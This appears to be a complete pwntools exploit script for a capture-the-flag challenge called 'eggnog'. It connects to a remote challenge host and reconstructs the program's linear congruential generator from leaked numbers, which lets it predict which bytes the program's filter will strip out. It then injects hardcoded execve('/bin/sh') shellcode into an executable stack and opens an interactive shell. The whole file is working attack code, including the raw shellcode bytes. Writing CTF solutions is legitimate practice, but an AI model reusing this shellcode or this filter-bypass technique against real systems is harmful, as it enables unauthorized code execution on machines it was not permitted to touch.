#!/usr/bin/env python2
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host challs.xmas.htsp.ro --port 12010 eggnog
from pwn import *
import numpy as np
from Crypto.Util.number import GCD, inverse

# Set up pwntools for the correct architecture
exe = context.binary = ELF('eggnog')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or 'challs.xmas.htsp.ro'
port = int(args.PORT or 12010)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
#break *0x{exe.symbols.main:x}
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    No canary found
# NX:       NX disabled
# PIE:      PIE enabled
# RWX:      Has RWX segments

def zeros_matrix(rows, cols):
    """
    Creates a matrix filled with zeros.
        :param rows: the number of rows the matrix should have
        :param cols: the number of columns the matrix should have
 
        :return: list of lists that form the matrix
    """
    M = []
    while len(M) < rows:
        M.append([])
        while len(M[-1]) < cols:
            M[-1].append(0.0)
 
    return M

def copy_matrix(M):
    """
    Creates and returns a copy of a matrix.
        :param M: The matrix to be copied
 
        :return: A copy of the given matrix
    """
    # Section 1: Get matrix dimensions
    rows = len(M)
    cols = len(M[0])
 
    # Section 2: Create a new matrix of zeros
    MC = zeros_matrix(rows, cols)
 
    # Section 3: Copy values of M into the copy
    for i in range(rows):
        for j in range(cols):
            MC[i][j] = M[i][j]
 
    return MC

def determinant_recursive(A, total=0):
    # Section 1: store indices in list for row referencing
    indices = list(range(len(A)))
     
    # Section 2: when at 2x2 submatrices recursive calls end
    if len(A) == 2 and len(A[0]) == 2:
        val = A[0][0] * A[1][1] - A[1][0] * A[0][1]
        return val
 
    # Section 3: define submatrix for focus column and 
    #      call this function
    for fc in indices: # A) for each focus column, ...
        # find the submatrix ...
        As = copy_matrix(A) # B) make a copy, and ...
        As = As[1:] # ... C) remove the first row
        height = len(As) # D) 
 
        for i in range(height): 
            # E) for each remaining row of submatrix ...
            #     remove the focus column elements
            As[i] = As[i][0:fc] + As[i][fc+1:] 
 
        sign = (-1) ** (fc % 2) # F) 
        # G) pass submatrix recursively
        sub_det = determinant_recursive(As)
        # H) total all returns from recursion
        total += sign * A[0][fc] * sub_det 
 
    return total

def get_modulus(vals):
    def get_det(a,b,c,d):
        mat = [[long(a),long(b),1],[long(b),long(c),1],[long(c),long(d),1]]
        return determinant_recursive(mat)
    
    modulus = get_det(*vals[0:4])
    #io.info(str(modulus) + " " + hex(modulus))

    for i in range(1, len(vals)-4):
        #io.info("Next det:" +  str(get_det(*vals[i:i+4])))
        modulus = GCD(modulus, get_det(*vals[i:i+4]))
        #io.info(str(modulus) + " " + hex(modulus))

    return modulus
        
io = start()
io.recvuntil("What eggs would you want to use for eggnog?\n")
io.sendline("A"*0x2d)

io.recvuntil("Filtered eggs: ")
vals = io.recvuntil("\n").split(" ")
vals = list(map(int, filter(None, vals[:-1])))

io.sendline("n")


n = get_modulus(vals)
x1, x2, x3 = tuple(vals[0:3])

multiplier = ((x2-x3) * inverse(x1 - x2, n)) % n
offset = (x2 - (x1 * multiplier)) % n

io.info("modulus: " + str(n) + " " + hex(n))
io.info("multiplier: " + str(multiplier) + " " + hex(multiplier))
io.info("offset: " + str(offset) + " " + hex(offset))

global lcg_state
lcg_state = vals[0]
def lcg_next():
    global lcg_state
    lcg_state = (lcg_state * multiplier + offset) % n

for i in vals[1:]:
    lcg_next()
    assert lcg_state == i

removed = set()
for i in range(14):
    lcg_next()
    io.info(str(i) + ", " + str(lcg_state) + "\tRemoved : " + str(lcg_state % 0x2d) + " (" + hex(lcg_state % 0x2d) + ")")
    removed.add(lcg_state % 0x2d)

io.recvuntil("What eggs would you want to use for eggnog?\n")

removed = sorted(list(removed))
shellcode = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
for i in removed:
    shellcode = shellcode[:i] + "A" + shellcode[i:]
shellcode += (0x2d - len(shellcode)) * "\x90"

io.sendline(shellcode)

io.recvuntil("Filtered eggs: ")
next_vals = io.recvuntil("\n").split(" ")
next_vals = list(map(int, filter(None, next_vals[:-1])))

io.interactive()

